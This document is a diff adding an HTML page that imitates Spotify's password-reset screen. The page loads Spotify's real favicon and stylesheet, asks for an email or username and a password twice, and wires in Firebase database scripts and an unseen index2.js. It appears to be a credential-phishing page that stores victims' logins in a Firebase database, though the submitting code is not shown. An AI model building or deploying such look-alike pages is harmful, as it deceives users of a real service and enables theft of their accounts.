@@ -1,0 +1,36 @@
+<html>
+  <head>
+    <meta charset="utf-8"/>
+    <title>Spotify Reset Password</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://accounts.scdn.co/sso/images/favicon.ace4d8543bbb017893402a1e9d1ac1fa.ico">
+    <link href="https://accounts.scdn.co/sso/css/index.ac7f626cb8e8fb58cd2d.css" media="screen" rel="stylesheet">
+  </head>
+  <body>
+    <img src="logo.JPG" class="center">
+    <hr class="line">
+    <p class="test">Please enter you information below to change your account password.</p>
+    <div class = "content">
+      <form id="enterinfo" class = "infoform">
+        <p>
+          <label>Email address or username</label>
+          <input type="email" class= "inputbox" name="email" id="email" required>
+        </p>
+        <p>
+          <label>Password</label>
+          <input type="password" class= "inputbox" name="password" id="password" required>
+        </p>
+        <p>
+          <label>Confirm Password</label>
+          <input type="password" class= "inputbox" name="password" id="password2" required>
+        </p>
+        <p>
+          <button type="submit" id ="submit" class="submit">Submit</button>
+        </p>
+      </form>
+    </div>
+    <script src="https://www.gstatic.com/firebasejs/8.4.3/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.4.3/firebase-database.js"></script>
+    <script src="index2.js"></script>       
+  </body>
+</html>
